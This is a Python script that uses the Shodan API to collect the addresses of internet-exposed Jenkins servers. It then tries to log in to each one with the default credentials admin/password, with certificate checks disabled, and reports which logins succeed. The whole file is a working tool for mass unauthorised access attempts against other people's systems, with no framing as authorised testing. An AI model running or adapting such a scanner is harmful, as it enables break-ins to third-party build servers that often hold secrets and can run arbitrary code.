import shodan
import requests as rt
import urllib3
API_key_shodan = "ENTER_YOUR_SHODAN_API_KEY" #your shodan api key goes here
api = shodan.Shodan(API_key_shodan)
out_file = open('textFiles/jenkins-instances.txt','a')
query = 'x-jenkins'
try:
    results = api.search(query)
    print(f"Results found: {results['total']}")
    for result in results['matches']:
        print(f"IP: {result['ip_str']}"+':'+str(result['port']))
        if result['port'] in [80,443]:
            if result['port']==80:
                scheme = "http://"
            else:
                scheme = "https://"
            out = scheme+result['ip_str']
        else:
            out = "http://"+result['ip_str']+':'+str(result['port'])
        out_file.write(out+'\n')
except shodan.APIError as e:
    print(f"Error: {e}")

    
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
urls = open("textFiles/jenkins-instances.txt","r")
data = {"j_username":"admin","j_password":"password"}
endpoint = "/j_acegi_security_check"
for url in urls.readlines():
    url = url.strip("\n")
    print("Testing- "+url)
    try:
        req = rt.post(url=url+endpoint,data=data,verify=False)
        if req.headers.get('location') and not "loginError" in req.headers["location"]:
            print("login Success")
    except:
        pass